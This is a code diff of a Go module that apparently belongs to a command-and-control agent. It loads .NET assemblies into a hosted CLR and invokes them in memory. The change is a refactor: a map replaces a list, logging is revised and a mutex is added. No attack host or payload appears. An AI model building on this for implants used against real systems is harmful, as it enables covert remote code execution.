@@ -6,7 +6,6 @@ import (
 	// Standard
 	"encoding/base64"
 	"fmt"
-
 	"strings"
 
 	// 3rd Party
@@ -22,7 +21,7 @@ import (
 var runtimeHost *clr.ICORRuntimeHost
 
 // assemblies is a list of the loaded assemblies that can be invoked
-var assemblies []assembly
+var assemblies = make(map[string]assembly)
 
 // redirected tracks if STDOUT/STDERR have been redirected for the CLR so that they can be captured
 // and send back to the server
@@ -39,20 +38,17 @@ type assembly struct {
 func CLR(cmd jobs.Command) jobs.Results {
 	clr.Debug = core.Debug
 	if len(cmd.Args) > 0 {
+		cli.Message(cli.SUCCESS, fmt.Sprintf("CLR module command: %s", cmd.Args[0]))
 		switch strings.ToLower(cmd.Args[0]) {
 		case "start":
 			return startCLR(cmd.Args[1])
 		case "list-assemblies":
-			cli.Message(cli.SUCCESS, "list-assemblies command received")
 			return listAssemblies()
 		case "load-assembly":
-			cli.Message(cli.SUCCESS, "load-assembly command received")
 			return loadAssembly(cmd.Args[1:])
 		case "load-clr":
-			cli.Message(cli.SUCCESS, "load-clr command received")
 			return startCLR(cmd.Args[1])
 		case "invoke-assembly":
-			cli.Message(cli.SUCCESS, "invoke-assembly command received")
 			return invokeAssembly(cmd.Args[1:])
 		default:
 			j := jobs.Results{
@@ -96,7 +92,8 @@ func startCLR(runtime string) (results jobs.Results) {
 
 // loadAssembly loads an assembly into the runtimeHost's default AppDomain
 func loadAssembly(args []string) (results jobs.Results) {
-	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for executeCommand function: %+v", args))
+	cli.Message(cli.DEBUG, "Entering into clr.loadAssembly()...")
+	//cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for loadAssembly function: %+v", args))
 	if len(args) > 1 {
 		var a assembly
 		a.name = strings.ToLower(args[1])
@@ -132,8 +129,8 @@ func loadAssembly(args []string) (results jobs.Results) {
 			return
 		}
 
-		assemblies = append(assemblies, a)
-		results.Stdout = fmt.Sprintf("successfully loaded %s into the default AppDomain", a.name)
+		assemblies[a.name] = a
+		results.Stdout = fmt.Sprintf("Successfully loaded %s into the default AppDomain", a.name)
 		cli.Message(cli.SUCCESS, results.Stdout)
 		return
 	}
@@ -144,6 +141,7 @@ func loadAssembly(args []string) (results jobs.Results) {
 
 // invokeAssembly executes a previously loaded assembly
 func invokeAssembly(args []string) (results jobs.Results) {
+	cli.Message(cli.DEBUG, "Entering into clr.invokeAssembly()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for invokeAssembly function: %+v", args))
 	cli.Message(cli.NOTE, fmt.Sprintf("Invoking .NET assembly: %s", args))
 	if len(args) > 0 {
@@ -156,13 +154,10 @@ func invokeAssembly(args []string) (results jobs.Results) {
 			}
 		}
 		if isLoaded {
+			core.Mutex.Lock()
 			results.Stdout, results.Stderr = clr.InvokeAssembly(a.methodInfo, args[1:])
-			if results.Stdout != "" {
-				cli.Message(cli.SUCCESS, results.Stdout)
-			}
-			if results.Stderr != "" {
-				cli.Message(cli.WARN, results.Stderr)
-			}
+			core.Mutex.Unlock()
+			cli.Message(cli.DEBUG, "Leaving clr.invokeAssembly() function without error")
 			return
 		}
 		results.Stderr = fmt.Sprintf("the '%s' assembly is not loaded", args[0])
